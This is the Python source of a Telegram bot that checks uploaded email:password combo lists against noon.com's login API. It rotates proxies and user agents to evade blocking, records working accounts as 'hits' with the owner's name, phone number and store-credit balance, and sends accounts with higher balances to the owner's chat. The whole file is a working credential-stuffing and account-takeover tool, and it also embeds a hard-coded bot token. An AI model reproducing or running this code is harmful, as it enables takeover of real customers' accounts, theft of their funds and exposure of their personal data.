

import requests
from requests.exceptions import RequestException
from user_agent import generate_user_agent
import random
import telebot
from telebot import types
import os,sys



token = '7005994403:AAEruxWOCEvuhMV7g5BRdZw7hllR4Ta8wq4'
IDOWNER = 6935296730

a = True
Bad_proxy = 0


bot=telebot.TeleBot(token)

user_name = bot.get_me().username
print(f" [!] bot username : @{user_name}")

def random_proxy() -> dict:
    with open("proxies.txt") as a:
        prox1 = f"{random.choice(a.read().splitlines()).strip()}:http"

    proxy_parts = prox1.split(":")
    proxy = f"{proxy_parts[-1]}://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"

    return {"http://": proxy, "https://": proxy}

@bot.message_handler(commands=['start'])
def start(message):
	if message.from_user.id == IDOWNER:
		idd = message.from_user.id
		first = message.from_user.first_name
		last = message.from_user.last_name
		if "None" in str(last):
			last = ""
		url = f"tg://user?id={idd}"
		bot.reply_to(message,
                   f"""hi  [{first + last}]({url}) 
Send Combo File""",
                   parse_mode="markdown")
	else:
		idd = message.from_user.id
		first = message.from_user.first_name
		last = message.from_user.last_name
		if "None" in str(last):
			last = ""
		url = f"tg://user?id={idd}"
		bot.reply_to(message,
                   f"""hi  [{first + last}]({url}) 
You cannot use the bot
To use the bot, contact me: @cb_pa""",
                   parse_mode="markdown")
		
def perform_login(em, ps):
    global a,Bad_proxy
    try:
        if not a:
            return {"status":"break"}
        proxy = random_proxy()
        neww = generate_user_agent()
        import requests
        r = requests.session()

        headers = {
            'authority': 'www.noon.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache, max-age=0, must-revalidate, no-store',
            'content-type': 'application/json',
            'origin': 'https://www.noon.com',
            'referer': 'https://www.noon.com/egypt-ar/account_mobile/',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': f'{neww}',
            'x-cms': 'v2',
            'x-content': 'mobile',
            'x-locale': 'ar-eg',
            'x-mp': 'noon',
            'x-platform': 'web',
        }

        json_data = {
            'email': em,
            'password': ps,
        }
        response = r.post('https://www.noon.com/_svc/customer-v1/auth/signin', headers=headers,
                          proxies=proxy, json=json_data)
        if response.status_code == 200:
            response = response.json()
            cod = response['data']['countryCode']
            joinDate = response['data']['joinDate']
            phon = response['data']['primaryPhoneNumber']
            fname = response['data']["firstName"]
            lname = response['data']["lastName"]

            headers = {
                'authority': 'www.noon.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'no-cache, max-age=0, must-revalidate, no-store',
                'content-type': 'application/json',
                'origin': 'https://www.noon.com',
                'referer': 'https://www.noon.com/egypt-ar/account_mobile/',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': f'{neww}',
                'x-cms': 'v2',
                'x-content': 'mobile',
                'x-locale': f'ar-{cod}',
                'x-mp': 'noon',
                'x-platform': 'web',
            }

            rs = r.get('https://account.noon.com/_svc/customer-v1/credit', headers=headers).json()
            balance = rs["data"]["balance"]
            currencyCode = rs["data"]["currencyCode"]
            return {"status":"True","account":[fname,lname,joinDate,cod,phon,balance,currencyCode]}

            print(f'''\033[2;32m New Account Hunted : {em}:{ps} | FirstName : {fname} | LastName : {lname} | join : {joinDate} | code : {cod} | PhoneNumber : {phon} | Balance : {balance} {currencyCode}''')

            '''with open("allHits.txt", "a") as x:
                x.write(
                    f"{em}:{ps} | FirstName : {fname} | LastName : {lname} | join : {joinDate} | code : {cod} | PhoneNumber : {phon} | Balance : {balance} {currencyCode}\n")
            if float(balance) >= 5:
                requests.post(f"""https://api.telegram.org/bot{to}/sendMessage?chat_id={id}&text=
New Account Hunted : {em}:{ps} 
| FirstName : {fname} 
| LastName : {lname} 
| join : {joinDate} 
| code : {cod} 
| PhoneNumber : {phon} 
| Balance : {balance} {currencyCode}
""")'''
        elif response.status_code == 403:
            print(f"\033[1;33m Retrying for {em}:{ps}")
            perform_login(em, ps, proxy)
            Bad_proxy += 1
			
        else:
            try:
                error = response.json()['error']
                return {"status":"Dec","msg":f"{error}"}
            except:
                error = "custom"
                return {"status":"custom"}

    except RequestException as e:
        print(e)
        print(f"\033[1;33m Retrying for {em}:{ps}")
        perform_login(em, ps, proxy)

@bot.message_handler(content_types=['document'])
def send_file(message):
    global a,Bad_proxy
    if message.from_user.id == IDOWNER:
        Work = 0
        Dec = 0
        Bad_proxy = 0
        custom = 0
        checked = 0
        low = 0
        Eg_low = 0
        sa_low = 0
        ua_low = 0
        high = 0
        Eg_high = 0
        sa_high = 0
        ua_high = 0
        try:
            file_input = bot.download_file(bot.get_file(message.document.file_id).file_path)
            with open(f"{message.document.file_name}", 'wb') as f:
                f.write(file_input)
        except:
            return bot.reply_to(message, text='مشكلة من الملف .')
        mas = types.InlineKeyboardMarkup(row_width=1)
        h7am0 = types.InlineKeyboardButton('Hamo • حـمــو', url='https://t.me/hamo_back')
        mas.add(h7am0)
        alll = len(open(f"{message.document.file_name}","r").read().splitlines())
        lool = bot.reply_to(message, text=f' Checking Your Combo...⌛', reply_markup=mas)
        a = True
        for acc in open(f"{message.document.file_name}","r").read().splitlines():
            try:
                email = acc.split(':')[0]
                password =acc.split(':')[1]
                if not a:
                    messg = "stoped"
                    ms = types.InlineKeyboardMarkup(row_width=3)
                    emma_pass = types.InlineKeyboardButton(f"{acc}", callback_data="#")
                    messg1 = types.InlineKeyboardButton(f"{messg}", callback_data="#")
                    Work1 = types.InlineKeyboardButton(f"Work : {Work}", callback_data=f"work1:{message.from_user.id}")
                    Dec1 = types.InlineKeyboardButton(f"Dec : {Dec}", callback_data="#")
                    custom1 = types.InlineKeyboardButton(f"custom : {custom}", callback_data="#")
                    Bad_proxy1 = types.InlineKeyboardButton(f"Bad proxy : {Bad_proxy}", callback_data="#")
                    checked1 = types.InlineKeyboardButton(f"checked : {checked}", callback_data="#")
                    low1 = types.InlineKeyboardButton(f"low : {low}", callback_data="#")
                    Eg_low1 = types.InlineKeyboardButton(f"EG : {Eg_low}", callback_data="#")
                    sa_low1 = types.InlineKeyboardButton(f"sa : {sa_low}", callback_data="#")
                    ua_low1 = types.InlineKeyboardButton(f"ua : {ua_low}", callback_data="#")
                    high1 = types.InlineKeyboardButton(f"high : {high}", callback_data="#")
                    Eg_high1 = types.InlineKeyboardButton(f"EG : {Eg_high}", callback_data="#")
                    sa_high1 = types.InlineKeyboardButton(f"sa : {sa_high}", callback_data="#")
                    ua_high1 = types.InlineKeyboardButton(f"ua : {ua_high}", callback_data="#")
                    total = types.InlineKeyboardButton(f"total : {alll}", callback_data="#")
                    stop = types.InlineKeyboardButton(f"stop", callback_data=f"stop1:{message.from_user.id}")
                    ms.add(emma_pass)
                    ms.add(messg1)
                    ms.add(Work1,Dec1)
                    ms.add(custom1,Bad_proxy1)
                    ms.add(checked1)
                    ms.add(low1)
                    ms.add(Eg_low1,sa_low1,ua_low1)
                    ms.add(high1)
                    ms.add(Eg_high1,sa_high1,ua_high1)
                    ms.add(high1)
                    ms.add(total)
                    ms.add(stop)
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=lool.message_id,text="Dev : @cb_pa", reply_markup=ms)
                    except:pass
                login_status = perform_login(email,password)
                if login_status["status"] == "Dec":
                    messg = login_status["msg"]
                    Dec += 1
                    checked += 1
                    ms = types.InlineKeyboardMarkup(row_width=3)
                    emma_pass = types.InlineKeyboardButton(f"{acc}", callback_data="#")
                    messg1 = types.InlineKeyboardButton(f"{messg}", callback_data="#")
                    Work1 = types.InlineKeyboardButton(f"Work : {Work}", callback_data=f"work1:{message.from_user.id}")
                    Dec1 = types.InlineKeyboardButton(f"Dec : {Dec}", callback_data="#")
                    custom1 = types.InlineKeyboardButton(f"custom : {custom}", callback_data="#")
                    Bad_proxy1 = types.InlineKeyboardButton(f"Bad proxy : {Bad_proxy}", callback_data="#")
                    checked1 = types.InlineKeyboardButton(f"checked : {checked}", callback_data="#")
                    low1 = types.InlineKeyboardButton(f"low : {low}", callback_data="#")
                    Eg_low1 = types.InlineKeyboardButton(f"EG : {Eg_low}", callback_data="#")
                    sa_low1 = types.InlineKeyboardButton(f"sa : {sa_low}", callback_data="#")
                    ua_low1 = types.InlineKeyboardButton(f"ua : {ua_low}", callback_data="#")
                    high1 = types.InlineKeyboardButton(f"high : {high}", callback_data="#")
                    Eg_high1 = types.InlineKeyboardButton(f"EG : {Eg_high}", callback_data="#")
                    sa_high1 = types.InlineKeyboardButton(f"sa : {sa_high}", callback_data="#")
                    ua_high1 = types.InlineKeyboardButton(f"ua : {ua_high}", callback_data="#")
                    total = types.InlineKeyboardButton(f"total : {alll}", callback_data="#")
                    stop = types.InlineKeyboardButton(f"stop", callback_data=f"stop1:{message.from_user.id}")
                    ms.add(emma_pass)
                    ms.add(messg1)
                    ms.add(Work1,Dec1)
                    ms.add(custom1,Bad_proxy1)
                    ms.add(checked1)
                    ms.add(low1)
                    ms.add(Eg_low1,sa_low1,ua_low1)
                    ms.add(high1)
                    ms.add(Eg_high1,sa_high1,ua_high1)
                    ms.add(high1)
                    ms.add(total)
                    ms.add(stop)
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=lool.message_id,text="Dev : @cb_pa", reply_markup=ms)
                    except:pass
                elif login_status["status"] == "break":
                    messg = "stoped"
                    ms = types.InlineKeyboardMarkup(row_width=3)
                    emma_pass = types.InlineKeyboardButton(f"{acc}", callback_data="#")
                    messg1 = types.InlineKeyboardButton(f"{messg}", callback_data="#")
                    Work1 = types.InlineKeyboardButton(f"Work : {Work}", callback_data=f"work1:{message.from_user.id}")
                    Dec1 = types.InlineKeyboardButton(f"Dec : {Dec}", callback_data="#")
                    custom1 = types.InlineKeyboardButton(f"custom : {custom}", callback_data="#")
                    Bad_proxy1 = types.InlineKeyboardButton(f"Bad proxy : {Bad_proxy}", callback_data="#")
                    checked1 = types.InlineKeyboardButton(f"checked : {checked}", callback_data="#")
                    low1 = types.InlineKeyboardButton(f"low : {low}", callback_data="#")
                    Eg_low1 = types.InlineKeyboardButton(f"EG : {Eg_low}", callback_data="#")
                    sa_low1 = types.InlineKeyboardButton(f"sa : {sa_low}", callback_data="#")
                    ua_low1 = types.InlineKeyboardButton(f"ua : {ua_low}", callback_data="#")
                    high1 = types.InlineKeyboardButton(f"high : {high}", callback_data="#")
                    Eg_high1 = types.InlineKeyboardButton(f"EG : {Eg_high}", callback_data="#")
                    sa_high1 = types.InlineKeyboardButton(f"sa : {sa_high}", callback_data="#")
                    ua_high1 = types.InlineKeyboardButton(f"ua : {ua_high}", callback_data="#")
                    total = types.InlineKeyboardButton(f"total : {alll}", callback_data="#")
                    stop = types.InlineKeyboardButton(f"stop", callback_data=f"stop1:{message.from_user.id}")
                    ms.add(emma_pass)
                    ms.add(messg1)
                    ms.add(Work1,Dec1)
                    ms.add(custom1,Bad_proxy1)
                    ms.add(checked1)
                    ms.add(low1)
                    ms.add(Eg_low1,sa_low1,ua_low1)
                    ms.add(high1)
                    ms.add(Eg_high1,sa_high1,ua_high1)
                    ms.add(high1)
                    ms.add(total)
                    ms.add(stop)
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=lool.message_id,text="Dev : @cb_pa", reply_markup=ms)
                    except:pass
                elif login_status["status"] == "True":
                    messg = "account work"
                    Work += 1
                    checked += 1
                    accont_info = login_status["account"]
                    fname = accont_info[0]
                    lname = accont_info[1]
                    joinDate = accont_info[2]
                    cod = accont_info[3]
                    phon = accont_info[4]
                    balance = accont_info[5]
                    currencyCode = accont_info[6]
                    with open("allHits.txt", "a") as x:
                        x.write(f"{email}:{password} | FirstName : {fname} | LastName : {lname} | join : {joinDate} | code : {cod} | PhoneNumber : {phon} | Balance : {balance} {currencyCode}\n")
                    if float(balance) >= 5:
                        high +=1
                        if f"{cod}" == "ae":
                            ua_high += 1
                        elif f"{cod}" == "sa":
                            sa_high += 1
                        elif f"{cod}" == "eg":
                            Eg_high += 1
                        bot.send_message(message.chat.id,f"""
New Account Hunted
| email : <code>{email}</code>
| password : <code>{password}</code>
| FirstName : {fname} 
| LastName : {lname} 
| join : {joinDate} 
| code : {cod} 
| PhoneNumber : {phon} 
| Balance : {balance} {currencyCode}
""",parse_mode='html')
                    else:
                        low +=1
                        if f"{cod}" == "ae":
                            ua_low += 1
                        elif f"{cod}" == "sa":
                            sa_low += 1
                        elif f"{cod}" == "eg":
                            Eg_low += 1
                    ms = types.InlineKeyboardMarkup(row_width=3)
                    emma_pass = types.InlineKeyboardButton(f"{acc}", callback_data="#")
                    messg1 = types.InlineKeyboardButton(f"{messg}", callback_data="#")
                    Work1 = types.InlineKeyboardButton(f"Work : {Work}", callback_data=f"work1:{message.from_user.id}")
                    Dec1 = types.InlineKeyboardButton(f"Dec : {Dec}", callback_data="#")
                    custom1 = types.InlineKeyboardButton(f"custom : {custom}", callback_data="#")
                    Bad_proxy1 = types.InlineKeyboardButton(f"Bad proxy : {Bad_proxy}", callback_data="#")
                    checked1 = types.InlineKeyboardButton(f"checked : {checked}", callback_data="#")
                    low1 = types.InlineKeyboardButton(f"low : {low}", callback_data="#")
                    Eg_low1 = types.InlineKeyboardButton(f"EG : {Eg_low}", callback_data="#")
                    sa_low1 = types.InlineKeyboardButton(f"sa : {sa_low}", callback_data="#")
                    ua_low1 = types.InlineKeyboardButton(f"ua : {ua_low}", callback_data="#")
                    high1 = types.InlineKeyboardButton(f"high : {high}", callback_data="#")
                    Eg_high1 = types.InlineKeyboardButton(f"EG : {Eg_high}", callback_data="#")
                    sa_high1 = types.InlineKeyboardButton(f"sa : {sa_high}", callback_data="#")
                    ua_high1 = types.InlineKeyboardButton(f"ua : {ua_high}", callback_data="#")
                    total = types.InlineKeyboardButton(f"total : {alll}", callback_data="#")
                    stop = types.InlineKeyboardButton(f"stop", callback_data=f"stop1:{message.from_user.id}")
                    ms.add(emma_pass)
                    ms.add(messg1)
                    ms.add(Work1,Dec1)
                    ms.add(custom1,Bad_proxy1)
                    ms.add(checked1)
                    ms.add(low1)
                    ms.add(Eg_low1,sa_low1,ua_low1)
                    ms.add(high1)
                    ms.add(Eg_high1,sa_high1,ua_high1)
                    ms.add(high1)
                    ms.add(total)
                    ms.add(stop)
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=lool.message_id,text="Dev : @cb_pa", reply_markup=ms)
                    except:pass
                elif login_status["status"] == "Dec":
                    messg = login_status["msg"]
                    Dec += 1
                    checked += 1
                    ms = types.InlineKeyboardMarkup(row_width=3)
                    emma_pass = types.InlineKeyboardButton(f"{acc}", callback_data="#")
                    messg1 = types.InlineKeyboardButton(f"{messg}", callback_data="#")
                    Work1 = types.InlineKeyboardButton(f"Work : {Work}", callback_data=f"work1:{message.from_user.id}")
                    Dec1 = types.InlineKeyboardButton(f"Dec : {Dec}", callback_data="#")
                    custom1 = types.InlineKeyboardButton(f"custom : {custom}", callback_data="#")
                    Bad_proxy1 = types.InlineKeyboardButton(f"Bad proxy : {Bad_proxy}", callback_data="#")
                    checked1 = types.InlineKeyboardButton(f"checked : {checked}", callback_data="#")
                    low1 = types.InlineKeyboardButton(f"low : {low}", callback_data="#")
                    Eg_low1 = types.InlineKeyboardButton(f"EG : {Eg_low}", callback_data="#")
                    sa_low1 = types.InlineKeyboardButton(f"sa : {sa_low}", callback_data="#")
                    ua_low1 = types.InlineKeyboardButton(f"ua : {ua_low}", callback_data="#")
                    high1 = types.InlineKeyboardButton(f"high : {high}", callback_data="#")
                    Eg_high1 = types.InlineKeyboardButton(f"EG : {Eg_high}", callback_data="#")
                    sa_high1 = types.InlineKeyboardButton(f"sa : {sa_high}", callback_data="#")
                    ua_high1 = types.InlineKeyboardButton(f"ua : {ua_high}", callback_data="#")
                    total = types.InlineKeyboardButton(f"total : {alll}", callback_data="#")
                    stop = types.InlineKeyboardButton(f"stop", callback_data=f"stop1:{message.from_user.id}")
                    ms.add(emma_pass)
                    ms.add(messg1)
                    ms.add(Work1,Dec1)
                    ms.add(custom1,Bad_proxy1)
                    ms.add(checked1)
                    ms.add(low1)
                    ms.add(Eg_low1,sa_low1,ua_low1)
                    ms.add(high1)
                    ms.add(Eg_high1,sa_high1,ua_high1)
                    ms.add(total)
                    ms.add(stop)
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=lool.message_id,text="Dev : @cb_pa", reply_markup=ms)
                    except:pass
            except:
                continue
        messg = "done check"
        ms = types.InlineKeyboardMarkup(row_width=3)
        emma_pass = types.InlineKeyboardButton(f"{acc}", callback_data="#")
        messg1 = types.InlineKeyboardButton(f"{messg}", callback_data="#")
        Work1 = types.InlineKeyboardButton(f"Work : {Work}", callback_data=f"work1:{message.from_user.id}")
        Dec1 = types.InlineKeyboardButton(f"Dec : {Dec}", callback_data="#")
        custom1 = types.InlineKeyboardButton(f"custom : {custom}", callback_data="#")
        Bad_proxy1 = types.InlineKeyboardButton(f"Bad proxy : {Bad_proxy}", callback_data="#")
        checked1 = types.InlineKeyboardButton(f"checked : {checked}", callback_data="#")
        low1 = types.InlineKeyboardButton(f"low : {low}", callback_data="#")
        Eg_low1 = types.InlineKeyboardButton(f"EG : {Eg_low}", callback_data="#")
        sa_low1 = types.InlineKeyboardButton(f"sa : {sa_low}", callback_data="#")
        ua_low1 = types.InlineKeyboardButton(f"ua : {ua_low}", callback_data="#")
        high1 = types.InlineKeyboardButton(f"high : {high}", callback_data="#")
        Eg_high1 = types.InlineKeyboardButton(f"EG : {Eg_high}", callback_data="#")
        sa_high1 = types.InlineKeyboardButton(f"sa : {sa_high}", callback_data="#")
        ua_high1 = types.InlineKeyboardButton(f"ua : {ua_high}", callback_data="#")
        total = types.InlineKeyboardButton(f"total : {alll}", callback_data="#")
        stop = types.InlineKeyboardButton(f"stop", callback_data=f"stop1:{message.from_user.id}")
        ms.add(emma_pass)
        ms.add(messg1)
        ms.add(Work1,Dec1)
        ms.add(custom1,Bad_proxy1)
        ms.add(checked1)
        ms.add(low1)
        ms.add(Eg_low1,sa_low1,ua_low1)
        ms.add(high1)
        ms.add(Eg_high1,sa_high1,ua_high1)
        ms.add(total)
        ms.add(stop)
        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=lool.message_id,text="Dev : @cb_pa", reply_markup=ms)
        except:pass
        a = False


@bot.callback_query_handler(func=lambda call: True)
def calling(call):
    global a
    user_id = call.from_user.id
    if call.data == f'stop1:{user_id}':
        a = False
    elif call.data == f'work1:{user_id}':
        try:
            doc = open(f"allHits.txt", 'rb')
            bot.send_document(call.message.chat.id, doc, caption="""كل الحسابات هنا""")
            doc.close()
            os.remove(f"allHits.txt")
        except:
            bot.send_message(call.message.chat.id,"""لا توجد حسابات محفوظة""")
    

print("""


   bot run ...
   enjoy""")

try:
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
except (ConnectionError) as e:
    sys.stdout.flush()
    os.execv(sys.argv[0], sys.argv)
else:
    bot.infinity_polling(timeout=25, long_polling_timeout=10)
